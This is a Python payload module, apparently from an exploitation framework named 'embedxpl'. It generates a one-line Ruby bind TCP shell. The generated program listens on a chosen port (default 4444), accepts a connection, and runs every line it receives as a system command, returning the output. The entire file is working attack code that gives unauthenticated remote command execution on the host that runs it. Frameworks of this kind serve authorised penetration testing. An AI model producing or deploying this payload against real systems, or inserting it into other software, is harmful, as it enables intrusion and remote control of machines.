"""Ruby Bind TCP Shell."""

from embedxpl.core.exploit.payloads import BasePayload


class Payload(BasePayload):
    __info__ = {
        "name": "Ruby Bind TCP",
        "description": "Ruby bind TCP shell — listens on target.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
    }

    options = {
        "LPORT": {"description": "Bind port", "required": True, "default": "4444", "value": "4444"},
    }

    def generate(self) -> bytes:
        lport = self.options["LPORT"]["value"]
        ruby = (
            f"require 'socket';"
            f"s=TCPServer.new({lport});"
            "c=s.accept;"
            "while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end"
        )
        return ruby.encode()
